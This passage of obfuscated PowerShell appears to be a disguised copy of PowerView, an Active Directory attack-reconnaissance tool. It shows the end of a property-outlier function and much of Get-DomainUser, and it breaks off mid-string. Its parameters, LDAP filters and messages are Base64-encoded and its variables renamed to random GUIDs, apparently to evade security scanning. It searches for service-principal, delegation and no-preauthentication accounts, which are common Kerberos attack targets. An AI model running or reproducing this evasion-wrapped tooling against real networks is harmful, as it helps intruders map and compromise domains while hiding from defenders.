('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        
${ea43c787582f45539b7f519da4680c7a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
             ${48e8cc6d8f9e485da939bcf5631335dc} = Get-Domain -
Domain $Domain | Select-Object -ExpandProperty Forest | Select-
Object -ExpandProperty Name
            }
            else {
           
     ${48e8cc6d8f9e485da939bcf5631335dc} = Get-Domain -Domain 
$Domain -Credential $Credential | Select-Object -ExpandProperty 
Forest | Select-Object -ExpandProperty Name
            }
            
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdA
B5AE8AdQB0AGwAaQBlAHIAXQAgAEUAbgB1AG0AZQByAGEAdABlAGQAIABmAG8AcgBlAH
MAdAAgACcAJAB7ADQAOABlADgAYwBjADYAZAA4AGYAOQBlADQAOAA1AGQAYQA5ADMAOQ
BiAGMAZgA1ADYAMwAxADMAMwA1AGQAYwB9ACcAIABmAG8AcgAgAHQAYQByAGcAZQB0AC
AAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwA=')))
        }
        
${0ddd5793aeee4616a4cbb90c8be971f4} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${0ddd5793aeee4616a4cbb90c8be971f4}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
(${48e8cc6d8f9e485da939bcf5631335dc}) {
            
${0ddd5793aeee4616a4cbb90c8be971f4}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))] = ${48e8cc6d8f9e485da939bcf5631335dc}
        
}
    }
    PROCESS {
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGYAZQByAGUAbgBjAGUAUAByAG8AcABlAHIAdAB5AFMAZQB0AA==')))]) {
   
         Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdA
B5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHMAcABlAGMAaQBmAGkAZQBkAC
AALQBSAGUAZgBlAHIAZQBuAGMAZQBQAHIAbwBwAGUAcgB0AHkAUwBlAHQA')))
       
     ${9f8b1f2de3f447b093f55d0260adc527} = $ReferencePropertySet
     
   }
        elseif ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGYAZQByAGUAbgBjAGUATwBiAGoAZQBjAHQA')))]) {
            
Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdA
B5AE8AdQB0AGwAaQBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAaQBuAGcAIABwAHIAbwBwAG
UAcgB0AHkAIABuAGEAbQBlAHMAIABmAHIAbwBtACAALQBSAGUAZgBlAHIAZQBuAGMAZQ
BPAGIAagBlAGMAdAAgAHQAbwAgAHUAcwBlACAAYQBzACAAdABoAGUAIAByAGUAZgBlAH
IAZQBuAGMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAHMAZQB0AA==')))
            
${9f8b1f2de3f447b093f55d0260adc527} = Get-Member -InputObject 
$ReferenceObject -MemberType NoteProperty | Select-Object -Expand 
Name
            ${020a5883b51c46a6b52cc497b0555f3e} = 
$ReferenceObject.objectclass | Select-Object -Last 1
            
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdA
B5AE8AdQB0AGwAaQBlAHIAXQAgAEMAYQBsAGMAdQBsAGEAdABlAGQAIABSAGUAZgBlAH
IAZQBuAGMAZQBPAGIAagBlAGMAdABDAGwAYQBzAHMAIAA6ACAAJAB7ADAAMgAwAGEANQ
A4ADgAMwBiADUAMQBjADQANgBhADYAYgA1ADIAYwBjADQAOQA3AGIAMAA1ADUANQBmAD
MAZQB9AA==')))
        }
        else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdA
B5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHQAaABlACAAZABlAGYAYQB1AG
wAdAAgAHIAZQBmAGUAcgBlAG4AYwBlACAAcAByAG8AcABlAHIAdAB5ACAAcwBlAHQAIA
BmAG8AcgAgAHQAaABlACAAbwBiAGoAZQBjAHQAIABjAGwAYQBzAHMAIAAnACQAQwBsAG
EAcwBzAE4AYQBtAGUAJwA=')))
        }
        if (($ClassName -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgA=')))) -or (${020a5883b51c46a6b52cc497b0555f3e} -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgA='))))) {
            
${0e45717995274589bc9301bb1489d18f} = Get-DomainUser 
@ea43c787582f45539b7f519da4680c7a
            if (-not 
${9f8b1f2de3f447b093f55d0260adc527}) {
                
${9f8b1f2de3f447b093f55d0260adc527} = 
${af360673fb424ae1b6b6b3cb7c0ec244}
            }
        }
        
elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) -or 
(${020a5883b51c46a6b52cc497b0555f3e} -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAA=='))))) {
            
${0e45717995274589bc9301bb1489d18f} = Get-DomainGroup 
@ea43c787582f45539b7f519da4680c7a
            if (-not 
${9f8b1f2de3f447b093f55d0260adc527}) {
                
${9f8b1f2de3f447b093f55d0260adc527} = 
${0aa22354c6b24241a84a3c7b3141d794}
            }
        }
        
elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) -or 
(${020a5883b51c46a6b52cc497b0555f3e} -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAA=='))))) {
            
${0e45717995274589bc9301bb1489d18f} = Get-DomainComputer 
@ea43c787582f45539b7f519da4680c7a
            if (-not 
${9f8b1f2de3f447b093f55d0260adc527}) {
                
${9f8b1f2de3f447b093f55d0260adc527} = 
${ee84ac222f5542eb94d45f21c324bb31}
            }
        }
        
else {
            throw 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdA
B5AE8AdQB0AGwAaQBlAHIAXQAgAEkAbgB2AGEAbABpAGQAIABjAGwAYQBzAHMAOgAgAC
QAQwBsAGEAcwBzAE4AYQBtAGUA')))
        }
        ForEach ($Object in 
${0e45717995274589bc9301bb1489d18f}) {
            
${11b596efcda74084863b5a6a56c20f17} = Get-Member -InputObject 
$Object -MemberType NoteProperty | Select-Object -Expand Name
        
    ForEach(${158fca6e879b4945aedaa62d35a16d98} in 
${11b596efcda74084863b5a6a56c20f17}) {
                if 
(${9f8b1f2de3f447b093f55d0260adc527} -NotContains 
${158fca6e879b4945aedaa62d35a16d98}) {
                    
${6f675a112d04499c838f32bbba9fa15a} = New-Object PSObject
            
        ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) 
$Object.SamAccountName
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdAB5AA=='))) ${158fca6e879b4945aedaa62d35a16d98}
   
                 ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VgBhAGwAdQBlAA=='))) $Object.
${158fca6e879b4945aedaa62d35a16d98}
                    
${6f675a112d04499c838f32bbba9fa15a}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwBwAGUAcgB0AHkATwB1AHQAbABpAGUAcg
A='))))
                    ${6f675a112d04499c838f32bbba9fa15a}
       
         }
            }
        }
    }
}
function Get-DomainUser {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    
[OutputType('PowerView.User.Raw')]
    [CmdletBinding
(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        
[Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [Switch]
        $SPN,
        [Switch]
        
$AdminCount,
        [Parameter(ParameterSetName = 
'AllowDelegation')]
        [Switch]
        $AllowDelegation,
        
[Parameter(ParameterSetName = 'DisallowDelegation')]
        
[Switch]
        $DisallowDelegation,
        [Switch]
        
$TrustedToAuth,
        [Alias('KerberosPreauthNotRequired', 
'NoPreauth')]
        [Switch]
        $PreauthNotRequired,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String
[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        
[Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 
'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        
[Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        
[Switch]
        $FindOne,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$Raw
    )
    DynamicParam {
        
${166ef91acae049d6998dbeb4efc8e2e2} = [Enum]::GetNames
(${9ad57110e7184c649f993e0b08059b53})
        
${166ef91acae049d6998dbeb4efc8e2e2} = 
${166ef91acae049d6998dbeb4efc8e2e2} | ForEach-Object {$_; 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBPAFQAXwAkAF8A')))}
        New-DynamicParameter -Name UACFilter 
-ValidateSet ${166ef91acae049d6998dbeb4efc8e2e2} -Type ([array])
    
}
    BEGIN {
        ${ea43c787582f45539b7f519da4680c7a} = @{}
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${27dc86b883bb446681492564ecbdd4a0} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
    }
    PROCESS {
        if 
($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
         
   New-DynamicParameter -CreateVariables -BoundParameters 
$PSBoundParameters
        }
        if 
(${27dc86b883bb446681492564ecbdd4a0}) {
            
${987d1cda8c15450d8512978866836ba0} = ''
            $Filter = ''
     
       $Identity | Where-Object {$_} | ForEach-Object {
              
  ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace('(', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))))
                if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAA==')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQ
A0AGMAOQAxADgAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQApAA==')))
   
             }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBDAE4APQA=')))) {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                    if ((-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        
${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQ
BkACAAZABvAG0AYQBpAG4AIAAnACQAewA4ADQANAAyADMAYwBiAGYANQBhADUANAA0AG
YAZAA2AGEAYQAwADUAZABjADcAMgAwADEAZgA4ADQAMgA1ADYAfQAnACAAZgByAG8AbQ
AgACcAJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANABkAD
cAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACcA')))
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                ${27dc86b883bb446681492564ecbdd4a0} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
   if (-not ${27dc86b883bb446681492564ecbdd4a0}) {
                   
         Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFUAbgBhAGIAbABlACAAdA
BvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAH
IAIABmAG8AcgAgACcAJAB7ADgANAA0ADIAMwBjAGIAZgA1AGEANQA0ADQAZgBkADYAYQ
BhADAANQBkAGMANwAyADAAMQBmADgANAAyADUANgB9ACcA')))
                   
     }
                    }
                }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -imatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQ
AtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
            
        ${3e0cccb945b440b99b2100f08845f4a8} = 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                 
   ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
             }
                elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3}.Contains('\')) {
                
    ${1a83f5c24b5141dcbf4cb4cd70c98c69} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.Replace
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -
OutputType Canonical
                    if 
(${1a83f5c24b5141dcbf4cb4cd70c98c69}) {
                        
$UserDomain = ${1a83f5c24b5141dcbf4cb4cd70c98c69}.SubString(0, 
${1a83f5c24b5141dcbf4cb4cd70c98c69}.IndexOf('/'))
                    
    ${e0e6b6d01ca04c90bf52fb20f9e41317} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.Split('\')[1]
                    
    ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAZQAwAGUANgBiADYAZA
AwADEAYwBhADAANABjADkAMABiAGYANQAyAGYAYgAyADAAZgA5AGUANAAxADMAMQA3AH
0AKQA=')))
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain
                        Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAZQ
BkACAAZABvAG0AYQBpAG4AIAAnACQAVQBzAGUAcgBEAG8AbQBhAGkAbgAnACAAZgByAG
8AbQAgACcAJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOAA4AGQANA
BkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACcA')))
                        
${27dc86b883bb446681492564ecbdd4a0} = Get-DomainSearcher 
@ea43c787582f45539b7f519da4680c7a
                    }
               
 }
                else {
                    
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMABjADIAYgA2AGUAYw
AxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH
0AKQA=')))
                }
            }
            if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
  $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
            }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBQAE4A')))]) {
                
Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbg
BnACAAZgBvAHIAIABuAG8AbgAtAG4AdQBsAGwAIABzAGUAcgB2AGkAYwBlACAAcAByAG
kAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMA')))
                $Filter += 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAqACkA')
))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                
Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbg
BnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAG
wAZQBnAGEAdABlAGQA')))
                $Filter += 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMg
AuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4AD
UANwA0ACkAKQA=')))
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABpAHMAYQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
           
     Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbg
BnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGEAcgBlACAAcwBlAG4AcwBpAH
